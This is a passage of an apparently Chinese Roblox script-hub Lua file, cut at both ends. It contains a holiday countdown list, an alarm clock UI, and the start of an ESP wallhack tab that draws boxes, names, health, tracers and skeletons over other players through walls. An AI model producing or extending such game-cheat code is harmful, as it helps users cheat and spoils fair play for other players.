        {name = "世界标准日", date = {2026,10,14}, type = "action"},
        {name = "世界粮食日", date = {2026,10,16}, type = "action"},
        {name = "世界消除贫困日", date = {2026,10,17}, type = "action"},
        {name = "联合国日", date = {2026,10,24}, type = "action"},
        {name = "万圣节", date = {2026,10,31}, type = "happy"},
        {name = "记者节", date = {2026,11,8}, type = "happy"},
        {name = "光棍节", date = {2026,11,11}, type = "happy"},
        {name = "世界糖尿病日", date = {2026,11,14}, type = "action"},
        {name = "国际大学生节", date = {2026,11,17}, type = "happy"},
        {name = "世界儿童日", date = {2026,11,20}, type = "action"},
        {name = "感恩节", date = {2026,11,26}, type = "happy"},
        {name = "世界艾滋病日", date = {2026,12,1}, type = "action"},
        {name = "全国法制宣传日", date = {2026,12,4}, type = "action"},
        {name = "国际志愿者日", date = {2026,12,5}, type = "action"},
        {name = "世界人权日", date = {2026,12,10}, type = "action"},
        {name = "南京大屠杀死难者国家公祭日", date = {2026,12,13}, type = "sad"},
        {name = "澳门回归纪念日", date = {2026,12,20}, type = "happy"},
        {name = "平安夜", date = {2026,12,24}, type = "happy"},
        {name = "圣诞节", date = {2026,12,25}, type = "happy"},
        {name = "毛泽东诞辰纪念日", date = {2026,12,26}, type = "normal"},
        {name = "元旦前夕", date = {2026,12,31}, type = "happy"},
        {name = "国际海关日", date = {2026,1,26}, type = "action"},
        {name = "世界湿地日", date = {2026,2,2}, type = "action"},
        {name = "国际母语日", date = {2026,2,21}, type = "action"},
        {name = "世界野生动物日", date = {2026,3,3}, type = "action"},
        {name = "国际幸福日", date = {2026,3,20}, type = "happy"},
        {name = "世界诗歌日", date = {2026,3,21}, type = "action"},
        {name = "世界戏剧日", date = {2026,3,27}, type = "action"},
        {name = "国际爵士乐日", date = {2026,4,30}, type = "action"},
        {name = "世界红十字日", date = {2026,5,8}, type = "action"},
        {name = "国际不再恐同日", date = {2026,5,17}, type = "action"},
        {name = "世界无烟日", date = {2026,5,31}, type = "action"},
        {name = "世界海洋日", date = {2026,6,8}, type = "action"},
        {name = "世界献血者日", date = {2026,6,14}, type = "action"},
        {name = "世界难民日", date = {2026,6,20}, type = "action"},
        {name = "国际体育记者日", date = {2026,7,2}, type = "happy"},
        {name = "世界土著人民国际日", date = {2026,8,9}, type = "action"},
        {name = "国际青年日", date = {2026,8,12}, type = "happy"},
        {name = "世界人道主义日", date = {2026,8,19}, type = "action"},
        {name = "国际翻译日", date = {2026,9,30}, type = "action"},
        {name = "国际老年人日", date = {2026,10,1}, type = "happy"},
        {name = "世界邮政日", date = {2026,10,9}, type = "action"},
        {name = "世界更年期关怀日", date = {2026,10,18}, type = "action"},
        {name = "世界发展信息日", date = {2026,10,24}, type = "action"},
        {name = "世界城市日", date = {2026,10,31}, type = "action"},
        {name = "世界男性健康日", date = {2026,11,3}, type = "action"},
        {name = "世界哲学日", date = {2026,11,21}, type = "action"},
        {name = "国际消除对妇女暴力日", date = {2026,11,25}, type = "action"},
        {name = "国际残疾人日", date = {2026,12,3}, type = "action"},
        {name = "国际民航日", date = {2026,12,7}, type = "action"},
        {name = "国际反腐败日", date = {2026,12,9}, type = "action"},
        {name = "国际山岳日", date = {2026,12,11}, type = "action"},
        {name = "世界强化免疫日", date = {2026,12,15}, type = "action"}
    }

    local timeFormat = "24小时制"
    local notifiedHolidays = {}
    local notificationEnabled = false

    about:Dropdown("时间格式", "", {"24小时制", "12小时制"}, function(v)
        timeFormat = v
    end)

    about:Toggle("节日通知", "",false, function(v)
        notificationEnabled = v
        if v then
            notifiedHolidays = {}
        end
    end)

    for i, holiday in ipairs(holidays) do
        labels[i] = about:Label(holiday.name .. ": 加载中...")
    end

    local function formatTime(hour, minute, second)
        if timeFormat == "12小时制" then
            local ampm = "AM"
            local h = hour % 12
            if h == 0 then
                h = 12
            end
            if hour >= 12 then
                ampm = "PM"
            end
            return string.format("%02d:%02d:%02d %s", h, minute, second, ampm)
        else
            return string.format("%02d:%02d:%02d", hour, minute, second)
        end
    end

    local function formatDate(year, month, day, hour, minute, second)
        return string.format("%04d年%02d月%02d日 %s", year, month, day, formatTime(hour, minute, second))
    end

    local function getHolidayMessage(name, type, days)
        if type == "happy" then
            if days then
                return string.format("%s还有%d天到达！提前祝%s快乐！", name, days, name)
            else
                return string.format("今天是%s！祝%s快乐！", name, name)
            end
        elseif type == "sad" then
            if days then
                return string.format("%s还有%d天，让我们铭记这个日子。", name, days)
            else
                return string.format("今天是%s，缅怀与铭记。", name)
            end
        elseif type == "action" then
            if days then
                return string.format("%s还有%d天到达！让我们一起关注！", name, days)
            else
                return string.format("今天是%s！让我们一起行动起来！", name)
            end
        else
            if days then
                return string.format("%s还有%d天到达。", name, days)
            else
                return string.format("今天是%s。", name)
            end
        end
    end

    task.spawn(function()
        while true do
            local currentTime = os.time()
            local timeTable = os.date("*t", currentTime)
            
            for i, holiday in ipairs(holidays) do
                if i == 1 then
                    labels[1].Text = "当前时间: " .. formatDate(
                        timeTable.year, 
                        timeTable.month, 
                        timeTable.day, 
                        timeTable.hour, 
                        timeTable.min, 
                        timeTable.sec
                    )
                else
                    local targetTime = os.time({year=holiday.date[1], month=holiday.date[2], day=holiday.date[3]})
                    local timeDiff = targetTime - currentTime
                    
                    if timeDiff > 0 then
                        local days = math.floor(timeDiff / 86400)
                        local hours = math.floor((timeDiff % 86400) / 3600)
                        local minutes = math.floor((timeDiff % 3600) / 60)
                        local seconds = timeDiff % 60
                        
                        labels[i].Text = string.format("%s倒计时: %d天%02d小时%02d分钟%02d秒", 
                            holiday.name, days, hours, minutes, seconds)
                        
                        if days <= 3 and days > 0 and not notifiedHolidays[holiday.name] and notificationEnabled then
                            notifiedHolidays[holiday.name] = true
                            XPHUBNotification:Notification({
                                Title = "节日提醒",
                                Text = getHolidayMessage(holiday.name, holiday.type, days),
                                Icon = "rbxassetid://136169594232359",
                                Duration = 5
                            })
                        end
                        
                    elseif timeDiff == 0 then
                        labels[i].Text = holiday.name .. "就是今天！！！"
                        
                        if not notifiedHolidays[holiday.name] and notificationEnabled then
                            notifiedHolidays[holiday.name] = true
                            XPHUBNotification:Notification({
                                Title = "节日提醒",
                                Text = getHolidayMessage(holiday.name, holiday.type, nil),
                                Icon = "rbxassetid://136169594232359",
                                Duration = 8
                            })
                        end
                    else
                        labels[i].Text = holiday.name .. "已过"
                    end
                end
            end
            
            task.wait(1)
        end
    end)
end

local about = PIJIAOBEN:section("闹钟", false)

local Alarm = {
    alarms = {},
    alarmSoundId = "rbxassetid://4590662766",
    isPlayingSound = false,
    snoozeTime = 5, 
    volume = 1
}
local alarmStatusLabel = about:Label("状态: 未设置闹钟")

about:Textbox("设置闹钟时间", "AlarmTime", "格式: 时:分", function(text)
    if text:match("^%d?%d:%d%d$") then  
        local hour, minute = text:match("(%d+):(%d+)")
        hour = tonumber(hour)
        minute = tonumber(minute)
        
        if hour and minute and hour >= 0 and hour <= 23 and minute >= 0 and minute <= 59 then
            table.insert(Alarm.alarms, {
                hour = hour,
                minute = minute,
                enabled = false,  
                triggered = false,
                id = #Alarm.alarms + 1,
                name = string.format("闹钟 %02d:%02d", hour, minute)
            })
            updateAlarmStatus()
            XPHUBNotification:Notification({
                Title = "闹钟设置",
                Text = string.format("已设置闹钟: %02d:%02d (默认关闭)", hour, minute),
                Icon = "rbxassetid://136169594232359",
                Duration = 3
            })
        else
            XPHUBNotification:Notification({
                Title = "闹钟设置",
                Text = "时间格式错误，请使用 时:分 格式 (如 7:30 或 07:30)",
                Icon = "rbxassetid://136169594232359",
                Duration = 3
            })
        end
    else
        XPHUBNotification:Notification({
            Title = "闹钟设置",
            Text = "时间格式错误，请使用 时:分 格式 (如 7:30 或 07:30)",
            Icon = "rbxassetid://136169594232359",
            Duration = 3
        })
    end
end)

about:Textbox("稍后提醒时间(分钟)", "SnoozeTime", "输入(默认5)", function(text)
    local minutes = tonumber(text)
    if minutes and minutes > 0 then
        Alarm.snoozeTime = minutes
        XPHUBNotification:Notification({
            Title = "闹钟设置",
            Text = string.format("稍后提醒时间设置为 %d 分钟", minutes),
            Icon = "rbxassetid://136169594232359",
            Duration = 3
        })
    else
        XPHUBNotification:Notification({
            Title = "闹钟设置",
            Text = "请输入有效的分钟数",
            Icon = "rbxassetid://136169594232359",
            Duration = 3
        })
    end
end)

about:Textbox("闹钟音量", "AlarmVolume", "输入(默认1)", function(text)
    local volume = tonumber(text)
    if volume and volume >= 0 and volume <= 10 then
        Alarm.volume = volume
        updateAlarmStatus()
        XPHUBNotification:Notification({
            Title = "闹钟设置",
            Text = string.format("闹钟音量设置为 %.1f", volume),
            Icon = "rbxassetid://136169594232359",
            Duration = 3
        })
    else
        XPHUBNotification:Notification({
            Title = "闹钟设置",
            Text = "音量范围应为 0 到 10",
            Icon = "rbxassetid://136169594232359",
            Duration = 3
        })
    end
end)

about:Textbox("设置闹钟声音ID", "AlarmSound", "输入声音ID", function(text)
    if text:match("^%d+$") then
        Alarm.alarmSoundId = "rbxassetid://" .. text
        XPHUBNotification:Notification({
            Title = "闹钟设置",
            Text = "闹钟声音已更新",
            Icon = "rbxassetid://136169594232359",
            Duration = 3
        })
    else
        XPHUBNotification:Notification({
            Title = "闹钟设置",
            Text = "声音ID格式错误，请输入数字",
            Icon = "rbxassetid://136169594232359",
            Duration = 3
        })
    end
end)

about:Button("停止闹钟声音", function()
    stopAlarmSound()
end)

about:Button("稍后提醒", function()
    snoozeAlarm()
end)

about:Button("查看当前闹钟", function()
    showAlarmList()
end)

about:Toggle("所有闹钟开关", "AllAlarmsSwitch", false, function(state)  
    for _, alarm in ipairs(Alarm.alarms) do
        alarm.enabled = state
    end
    updateAlarmStatus()
    XPHUBNotification:Notification({
        Title = "闹钟设置",
        Text = state and "已开启所有闹钟" or "已关闭所有闹钟",
        Icon = "rbxassetid://136169594232359",
        Duration = 3
    })
end)

about:Button("清除所有闹钟", function()
    Alarm.alarms = {}
    updateAlarmStatus()
    XPHUBNotification:Notification({
        Title = "闹钟设置",
        Text = "已清除所有闹钟",
        Icon = "rbxassetid://136169594232359",
        Duration = 3
    })
end)

function playAlarmSound()
    if Alarm.isPlayingSound then return end
    
    Alarm.isPlayingSound = true
    local sound = Instance.new("Sound")
    sound.SoundId = Alarm.alarmSoundId
    sound.Volume = Alarm.volume  
    sound.Parent = game:GetService("SoundService")
    sound:Play()
    
    delay(30, function()
        if sound then
            sound:Stop()
            sound:Destroy()
            Alarm.isPlayingSound = false
        end
    end)
end

function stopAlarmSound()
    Alarm.isPlayingSound = false
    local soundService = game:GetService("SoundService")
    for _, sound in pairs(soundService:GetChildren()) do
        if sound:IsA("Sound") then
            sound:Stop()
            sound:Destroy()
        end
    end
end

function snoozeAlarm()
    stopAlarmSound()
    
    local currentTime = os.time()
    local snoozeTime = currentTime + (Alarm.snoozeTime * 60)
    local snoozeTable = os.date("*t", snoozeTime)
    
    table.insert(Alarm.alarms, {
        hour = snoozeTable.hour,
        minute = snoozeTable.min,
        enabled = false,  
        triggered = false,
        id = #Alarm.alarms + 1,
        name = string.format("稍后提醒 %02d:%02d", snoozeTable.hour, snoozeTable.min)
    })
    
    updateAlarmStatus()
    
    XPHUBNotification:Notification({
        Title = "稍后提醒",
        Text = string.format("%d分钟后再次提醒 (需要手动开启)", Alarm.snoozeTime),
        Icon = "rbxassetid://136169594232359",
        Duration = 3
    })
end

function showAlarmList()
    if #Alarm.alarms == 0 then
        XPHUBNotification:Notification({
            Title = "闹钟列表",
            Text = "当前没有设置闹钟",
            Icon = "rbxassetid://136169594232359",
            Duration = 3
        })
    else
        local alarmList = string.format("共有 %d 个闹钟 (音量: %.1f):\n", #Alarm.alarms, Alarm.volume)
        for i, alarm in ipairs(Alarm.alarms) do
            local status = alarm.enabled and "✅" or "❌"
            local triggered = alarm.triggered and "⏰" or "⏳"
            alarmList = alarmList .. string.format("%s%s %02d:%02d - %s\n", status, triggered, alarm.hour, alarm.minute, alarm.name)
        end
        XPHUBNotification:Notification({
            Title = "闹钟列表",
            Text = alarmList,
            Icon = "rbxassetid://136169594232359",
            Duration = 5
        })
    end
end

function updateAlarmStatus()
    if #Alarm.alarms == 0 then
        alarmStatusLabel.Text = "状态: 未设置闹钟"
    else
        local activeCount = 0
        for _, alarm in ipairs(Alarm.alarms) do
            if alarm.enabled and not alarm.triggered then
                activeCount = activeCount + 1
            end
        end
        alarmStatusLabel.Text = string.format("状态: %d个闹钟 (%d个开启) 音量:%.1f", #Alarm.alarms, activeCount, Alarm.volume)
    end
end

function checkAlarms()
    local currentTime = os.date("*t")
    local currentHour = currentTime.hour
    local currentMinute = currentTime.min
    
    for i, alarm in ipairs(Alarm.alarms) do
        if alarm.enabled and not alarm.triggered then
            if currentHour == alarm.hour and currentMinute == alarm.minute then
                alarm.triggered = true

                XPHUBNotification:Notification({
                    Title = "⏰ 闹钟提醒",
                    Text = string.format("%s\n时间: %02d:%02d\n音量: %.1f\n点击'稍后提醒'%d分钟后再响", alarm.name, alarm.hour, alarm.minute, Alarm.volume, Alarm.snoozeTime),
                    Icon = "rbxassetid://136169594232359",
                    Duration = 10
                })
                
                playAlarmSound()
            end
        elseif alarm.triggered and (currentHour ~= alarm.hour or currentMinute ~= alarm.minute) then
            alarm.triggered = false
        end
    end
end

function resetDailyAlarms()
    local currentTime = os.date("*t")
    if currentTime.hour == 0 and currentTime.min == 0 then
        for _, alarm in ipairs(Alarm.alarms) do
            alarm.triggered = false
        end
        updateAlarmStatus()
    end
end

task.spawn(function()
    while true do
        checkAlarms()
        resetDailyAlarms()
        task.wait(10) 
    end
end)

updateAlarmStatus()

local PIJIAOBEN = XIAOPI:Tab("透视","136169594232359")

local run = function(func) func() end

run(function()
    _G.ESP = {
        Enabled = false,
        ShowBox = false,
        ShowHealth = false,
        ShowName = false,
        ShowDistance = false,
        ShowTracer = false,
        ShowPlayerCount = false,
        ShowBones = false,
        TeamCheck = false,
        WallCheck = false,
        AliveCheck = false,
        FriendCheck = false,
        ShowHighlight = false,
        ShowGlow = false,
        ShowHeadDot = false,
        BoxStyle = "矩形",
        ColorMode = "固定",
        HighlightColor = Color3.fromRGB(255, 0, 0),
        BoxColor = Color3.fromRGB(255, 255, 255),
        HealthColor = Color3.fromRGB(0, 255, 0),
        NameColor = Color3.fromRGB(255, 255, 255),
        DistanceColor = Color3.fromRGB(255, 255, 0),
        TracerColor = Color3.fromRGB(255, 0, 0),
        PlayerCountColor = Color3.fromRGB(255, 255, 255),
        TracerOrigin = "身体",
        ESPColor = Color3.fromRGB(255, 255, 255)
    }
end)

run(function()
    _G.ColorMap = {
        ["红色"] = Color3.fromRGB(255, 0, 0),
        ["蓝色"] = Color3.fromRGB(0, 0, 255),
        ["黄色"] = Color3.fromRGB(255, 255, 0),
        ["绿色"] = Color3.fromRGB(0, 255, 0),
        ["青色"] = Color3.fromRGB(0, 255, 255),
        ["橙色"] = Color3.fromRGB(255, 165, 0),
        ["紫色"] = Color3.fromRGB(128, 0, 128),
        ["粉色"] = Color3.fromRGB(255, 192, 203),
        ["棕色"] = Color3.fromRGB(165, 42, 42),
        ["灰色"] = Color3.fromRGB(128, 128, 128),
        ["白色"] = Color3.fromRGB(255, 255, 255),
        ["黑色"] = Color3.fromRGB(0, 0, 0),
        ["彩色"] = Color3.fromRGB(255, 0, 0)
    }
    
    _G.getRainbowColor = function()
        local hue = (tick() % 5) / 5
        return Color3.fromHSV(hue, 1, 1)
    end
end)

run(function()
    local Players = game:GetService("Players")
    local RunService = game:GetService("RunService")
    local Camera = workspace.CurrentCamera
    local LocalPlayer = Players.LocalPlayer
    
    local highlights = {}
    local espObjects = {}
    local playerCountText = nil
    local connections = {}
    local renderConnections = {}
    
    local function isFriend(player)
        if not _G.ESP.FriendCheck then return false end
        local success, isFriendResult = pcall(function()
            return LocalPlayer:IsFriendsWith(player.UserId)
        end)
        return success and isFriendResult
    end
    
    local function isWallBetween(player)
        if not _G.ESP.WallCheck then return false end
        local targetCharacter = player.Character
        if not targetCharacter then return false end
        local targetRoot = targetCharacter:FindFirstChild("HumanoidRootPart")
        if not targetRoot then return false end
        local myCharacter = LocalPlayer.Character
        if not myCharacter then return false end
        local rayOrigin = Camera.CFrame.Position
        local direction = (targetRoot.Position - rayOrigin)
        local rayDistance = direction.Magnitude
        direction = direction.Unit
        local ignoreList = {myCharacter, targetCharacter}
        local raycastParams = RaycastParams.new()
        raycastParams.FilterDescendantsInstances = ignoreList
        raycastParams.FilterType = Enum.RaycastFilterType.Blacklist
        raycastParams.IgnoreWater = true
        local raycastResult = workspace:Raycast(rayOrigin, direction * rayDistance, raycastParams)
        return raycastResult ~= nil
    end
    
    local function shouldFilterPlayer(player)
        if player == LocalPlayer then return true end
        local character = player.Character
        if not character then return true end
        local humanoid = character:FindFirstChildOfClass("Humanoid")
        if not humanoid then return true end
        if _G.ESP.TeamCheck then
            local playerTeam = player.Team
            local localPlayerTeam = LocalPlayer.Team
            if playerTeam and localPlayerTeam and playerTeam == localPlayerTeam then
                return true
            end
        end
        if _G.ESP.FriendCheck and isFriend(player) then
            return true
        end
        if _G.ESP.AliveCheck then
            if humanoid.Health <= 0 or humanoid:GetState() == Enum.HumanoidStateType.Dead then
                return true
            end
        end
        if _G.ESP.WallCheck and isWallBetween(player) then
            return true
        end
        return false
    end
    
    local function getPlayerColor(player, humanoid, distance)
        local baseColor = _G.ESP.ESPColor
        if _G.ESP.ColorMode == "按血量" and humanoid then
            local healthPercent = humanoid.Health / humanoid.MaxHealth
            if healthPercent > 0.6 then
                return Color3.fromRGB(0, 255, 0)
            elseif healthPercent > 0.3 then
                return Color3.fromRGB(255, 255, 0)
            else
                return Color3.fromRGB(255, 0, 0)
            end
        elseif _G.ESP.ColorMode == "按距离" and distance then
            if distance < 50 then
                return Color3.fromRGB(255, 0, 0)
            elseif distance < 150 then
                return Color3.fromRGB(255, 255, 0)
            else
                return Color3.fromRGB(0, 255, 0)
            end
        elseif _G.ESP.ColorMode == "按队伍" then
            if player.Team then
                return player.Team.TeamColor.Color
            end
        end
        if baseColor == _G.ColorMap["彩色"] then
            return _G.getRainbowColor()
        end
        return baseColor
    end
    
    local function updateGlow(player, espColor)
        if not _G.ESP.ShowGlow then
            local character = player.Character
            if character then
                local rootPart = character:FindFirstChild("HumanoidRootPart")
                if rootPart then
                    local pointLight = rootPart:FindFirstChildOfClass("PointLight")
                    if pointLight then
                        pcall(function() pointLight:Destroy() end)
                    end
                end
            end
            return
        end
        if shouldFilterPlayer(player) then
            local character = player.Character
            if character then
                local rootPart = character:FindFirstChild("HumanoidRootPart")
                if rootPart then
                    local pointLight = rootPart:FindFirstChildOfClass("PointLight")
                    if pointLight then
                        pcall(function() pointLight:Destroy() end)
                    end
                end
            end
            return
        end
        local character = player.Character
        if not character then return end
        local rootPart = character:FindFirstChild("HumanoidRootPart")
        if not rootPart then return end
        local pointLight = rootPart:FindFirstChildOfClass("PointLight")
        if not pointLight then
            pointLight = Instance.new("PointLight")
            pointLight.Parent = rootPart
        end
        pointLight.Brightness = 5
        pointLight.Range = 15
        pointLight.Color = espColor
    end
    
    local function drawBox(espData, centerX, centerY, width, height, espColor)
        if _G.ESP.BoxStyle == "角框" then
            local cornerSize = math.min(width, height) * 0.15
            local halfW = width / 2
            local halfH = height / 2
            espData.boxLines = espData.boxLines or {}
            local corners = {
                {centerX - halfW, centerY - halfH, centerX - halfW + cornerSize, centerY - halfH},
                {centerX - halfW, centerY - halfH, centerX - halfW, centerY - halfH + cornerSize},
                {centerX + halfW - cornerSize, centerY - halfH, centerX + halfW, centerY - halfH},
                {centerX + halfW, centerY - halfH, centerX + halfW, centerY - halfH + cornerSize},
                {centerX - halfW, centerY + halfH - cornerSize, centerX - halfW, centerY + halfH},
                {centerX - halfW, centerY + halfH, centerX - halfW + cornerSize, centerY + halfH},
                {centerX + halfW - cornerSize, centerY + halfH, centerX + halfW, centerY + halfH},
                {centerX + halfW, centerY + halfH - cornerSize, centerX + halfW, centerY + halfH}
            }
            for i, corner in ipairs(corners) do
                local line
                if espData.boxLines[i] then
                    line = espData.boxLines[i]
                else
                    line = Drawing.new("Line")
                    line.Thickness = 2
                    table.insert(espData.boxLines, line)
                end
                line.From = Vector2.new(corner[1], corner[2])
                line.To = Vector2.new(corner[3], corner[4])
                line.Color = espColor
                line.Visible = true
            end
            for i = #corners + 1, #espData.boxLines do
                espData.boxLines[i].Visible = false
            end
            espData.box.Visible = false
            if espData.circle then espData.circle.Visible = false end
        elseif _G.ESP.BoxStyle == "圆形" then
            espData.box.Visible = false
            if espData.boxLines then
                for _, line in ipairs(espData.boxLines) do
                    line.Visible = false
                end
            end
            espData.circle = espData.circle or Drawing.new("Circle")
            espData.circle.Thickness = 2
            espData.circle.Radius = math.max(width, height) / 2
            espData.circle.Position = Vector2.new(centerX, centerY)
            espData.circle.Color = espColor
            espData.circle.Visible = true
            espData.circle.Filled = false
        else
            if espData.boxLines then
                for _, line in ipairs(espData.boxLines) do
                    line.Visible = false
                end
            end
            if espData.circle then
                espData.circle.Visible = false
            end
            espData.box.Size = Vector2.new(width, height)
            espData.box.Position = Vector2.new(centerX - width / 2, centerY - height / 2)
            espData.box.Visible = true
        end
    end
    
    local function createPlayerCountText()
        if playerCountText then
            pcall(function() playerCountText:Remove() end)
            playerCountText = nil
        end
        playerCountText = Drawing.new("Text")
        playerCountText.Visible = false
        playerCountText.Color = _G.ESP.ESPColor
        playerCountText.Size = 20
        playerCountText.Center = true
        playerCountText.Outline = true
        playerCountText.Position = Vector2.new(Camera.ViewportSize.X / 2, 30)
    end
    
    local function getAlivePlayerCount()
        local aliveCount = 0
        for _, player in pairs(Players:GetPlayers()) do
            if player ~= LocalPlayer then
                local character = player.Character
                if character then
                    local humanoid = character:FindFirstChildOfClass("Humanoid")
                    if humanoid and humanoid.Health > 0 and humanoid:GetState() ~= Enum.HumanoidStateType.Dead then
                        aliveCount = aliveCount + 1
                    end
                end
            end
        end
        return aliveCount
    end
   
    local function updatePlayerCountDisplay()
        if not playerCountText then
            createPlayerCountText()
        end
        if not _G.ESP.Enabled or not _G.ESP.ShowPlayerCount then
            if playerCountText then
                playerCountText.Visible = false
            end
            return
        end
        local totalPlayers = #Players:GetPlayers()
        local alivePlayers = getAlivePlayerCount()
        if _G.ESP.ESPColor == _G.ColorMap["彩色"] then
            playerCountText.Color = _G.getRainbowColor()
        else
            playerCountText.Color = _G.ESP.ESPColor
        end
        playerCountText.Text = string.format("存活:%d  总人数:%d", alivePlayers, totalPlayers)
        playerCountText.Position = Vector2.new(Camera.ViewportSize.X / 2, 30)
        playerCountText.Visible = true
    end
    
    local function cleanupHighlights()
        for player, highlight in pairs(highlights) do
            if highlight then
                pcall(function() highlight:Destroy() end)
            end
        end
        table.clear(highlights)
    end
    
    local function updateHighlight(player, espColor)
        if not _G.ESP.ShowHighlight then
            if highlights[player] then
                pcall(function() highlights[player]:Destroy() end)
                highlights[player] = nil
            end
            return
        end
        if shouldFilterPlayer(player) then
            if highlights[player] then
                pcall(function() highlights[player]:Destroy() end)
                highlights[player] = nil
            end
            return
        end
        local character = player.Character
        if not character then
            if highlights[player] then
                pcall(function() highlights[player]:Destroy() end)
                highlights[player] = nil
            end
            return
        end
        if not highlights[player] then
            local highlight = Instance.new("Highlight")
            highlight.Name = "ESP_Highlight"
            highlight.Adornee = character
            highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
            highlight.FillColor = espColor
            highlight.OutlineColor = Color3.new(1, 1, 1)
            highlight.FillTransparency = 0.5
            highlight.OutlineTransparency = 0
            highlight.Parent = character
            highlights[player] = highlight
        else
            highlights[player].Adornee = character
            highlights[player].FillColor = espColor
        end
    end
    
    local function getTracerOrigin(player)
        local character = player.Character
        if not character then return nil end
        if _G.ESP.TracerOrigin == "头部" then
            return character:FindFirstChild("Head")
        else
            return character:FindFirstChild("HumanoidRootPart") or character:FindFirstChild("Torso") or character:FindFirstChild("Head")
        end
    end
    
    local function getESPColor()
        if _G.ESP.ESPColor == _G.ColorMap["彩色"] then
            return _G.getRainbowColor()
        end
        return _G.ESP.ESPColor
    end
    
    local function drawBones(character, espColor)
        if not character then return {} end
        
        local bonesLines = {}
        local partPositions = {}
        
        local function getPartPos(partName)
            local part = character:FindFirstChild(partName)
            if part and part:IsA("BasePart") then
                local pos, onScreen = Camera:WorldToViewportPoint(part.Position)
                if onScreen then
                    return Vector2.new(pos.X, pos.Y)
                end
            end
            return nil
        end
        
        local function addBone(fromPart, toPart)
            if fromPart and toPart and partPositions[fromPart] and partPositions[toPart] then
                local line = Drawing.new("Line")
                line.Visible = true
                line.From = partPositions[fromPart]
                line.To = partPositions[toPart]
                line.Color = espColor
                line.Thickness = 1.5
                table.insert(bonesLines, line)
                return true
            end
            return false
        end
        
        local boneNames = {
            "Head", "HumanoidRootPart", "Torso", "UpperTorso", "LowerTorso",
            "LeftUpperArm", "LeftLowerArm", "LeftHand",
            "RightUpperArm", "RightLowerArm", "RightHand",
            "LeftUpperLeg", "LeftLowerLeg", "LeftFoot",
            "RightUpperLeg", "RightLowerLeg", "RightFoot",
            "LeftArm", "RightArm", "LeftLeg", "RightLeg",
            "Spine", "Spine1", "Spine2", "Neck", "Root"
        }
        
        for _, name in ipairs(boneNames) do
            local pos = getPartPos(name)
            if pos then
                partPositions[name] = pos
            end
        end
        
        if not next(partPositions) then
            for _, part in ipairs(character:GetChildren()) do
                if part:IsA("BasePart") then
                    local pos, onScreen = Camera:WorldToViewportPoint(part.Position)
                    if onScreen then
                        partPositions[part.Name] = Vector2.new(pos.X, pos.Y)
                    end
                end
            end
        end
        
        if not next(partPositions) then
            return {}
        end
        
        local hasUpperTorso = partPositions["UpperTorso"] ~= nil
        local hasLowerTorso = partPositions["LowerTorso"] ~= nil
        local hasTorso = partPositions["Torso"] ~= nil
        
        if hasUpperTorso and hasLowerTorso then
            addBone("HumanoidRootPart", "UpperTorso")
            addBone("UpperTorso", "LowerTorso")
            addBone("UpperTorso", "Head")
            addBone("UpperTorso", "LeftUpperArm")
            addBone("LeftUpperArm", "LeftLowerArm")
            addBone("LeftLowerArm", "LeftHand")
            addBone("UpperTorso", "RightUpperArm")
            addBone("RightUpperArm", "RightLowerArm")
            addBone("RightLowerArm", "RightHand")
            addBone("LowerTorso", "LeftUpperLeg")
            addBone("LeftUpperLeg", "LeftLowerLeg")
            addBone("LeftLowerLeg", "LeftFoot")
            addBone("LowerTorso", "RightUpperLeg")
            addBone("RightUpperLeg", "RightLowerLeg")
            addBone("RightLowerLeg", "RightFoot")
            addBone("Spine", "UpperTorso")
            addBone("Spine1", "Spine")
            addBone("Spine2", "Spine1")
        elseif hasTorso then
            addBone("HumanoidRootPart", "Torso")
            addBone("Torso", "Head")
            addBone("Torso", "LeftArm")
            addBone("Torso", "RightArm")
            addBone("Torso", "LeftLeg")
            addBone("Torso", "RightLeg")
        else
            local allParts = {}
            for name, _ in pairs(partPositions) do
                table.insert(allParts, name)
            end
            for i = 1, #allParts do
                for j = i + 1, #allParts do
                    local name1 = allParts[i]
                    local name2 = allParts[j]
                    if name1 ~= "HumanoidRootPart" and name2 ~= "HumanoidRootPart" then
                        local dist = (partPositions[name1] - partPositions[name2]).Magnitude
                        if dist < 80 then
                            addBone(name1, name2)
                        end
                    end
                end
            end
            if partPositions["HumanoidRootPart"] then
                for name, pos in pairs(partPositions) do
                    if name ~= "HumanoidRootPart" then
                        local dist = (partPositions["HumanoidRootPart"] - pos).Magnitude
                        if dist < 60 then
                            addBone("HumanoidRootPart", name)
                        end
                    end
                end
            end
        end
        
        return bonesLines
    end
    
    local function createESP(player)
        if espObjects[player] then
            cleanupPlayerESP(player)
        end
        
        local espData = {
            box = Drawing.new("Square"),
            boxLines = {},
            circle = nil,
            headDot = Drawing.new("Circle"),
            healthText = Drawing.new("Text"),
            nameText = Drawing.new("Text"),
            distanceText = Drawing.new("Text"),
            tracer = Drawing.new("Line"),
            bonesLines = {},
            active = true,
            player = player
        }
        
        espData.box.Visible = false
        espData.box.Color = _G.ESP.ESPColor
        espData.box.Thickness = 1
        espData.box.Filled = false
        
        espData.headDot.Visible = false
        espData.headDot.Color = _G.ESP.ESPColor
        espData.headDot.Radius = 4
        espData.headDot.Filled = true
        espData.headDot.Thickness = 1
        
        espData.healthText.Visible = false
        espData.healthText.Color = _G.ESP.ESPColor
        espData.healthText.Size = 16
        espData.healthText.Center = true
        espData.healthText.Outline = true
        
        espData.nameText.Visible = false
        espData.nameText.Color = _G.ESP.ESPColor
        espData.nameText.Size = 16
        espData.nameText.Center = true
        espData.nameText.Outline = true
        
        espData.distanceText.Visible = false
        espData.distanceText.Color = _G.ESP.ESPColor
        espData.distanceText.Size = 16
        espData.distanceText.Center = true
        espData.distanceText.Outline = true
        
        espData.tracer.Visible = false
        espData.tracer.Color = _G.ESP.ESPColor
        espData.tracer.Thickness = 1
        
        espObjects[player] = espData
        
        local renderConnection = RunService.RenderStepped:Connect(function()
            if not espData or not espData.active then
                return
            end
            
            if not _G.ESP.Enabled then
                espData.box.Visible = false
                espData.headDot.Visible = false
                espData.healthText.Visible = false
                espData.nameText.Visible = false
                espData.distanceText.Visible = false
                espData.tracer.Visible = false
                for _, line in ipairs(espData.bonesLines) do
                    line.Visible = false
                end
                if espData.circle then espData.circle.Visible = false end
                if espData.boxLines then
                    for _, line in ipairs(espData.boxLines) do
                        line.Visible = false
                    end
                end
                updatePlayerCountDisplay()
                return
            end
            
            updatePlayerCountDisplay()
            
            if shouldFilterPlayer(player) then
                espData.box.Visible = false
                espData.headDot.Visible = false
                espData.healthText.Visible = false
                espData.nameText.Visible = false
                espData.distanceText.Visible = false
                espData.tracer.Visible = false
                for _, line in ipairs(espData.bonesLines) do
                    line.Visible = false
                end
                if espData.circle then espData.circle.Visible = false end
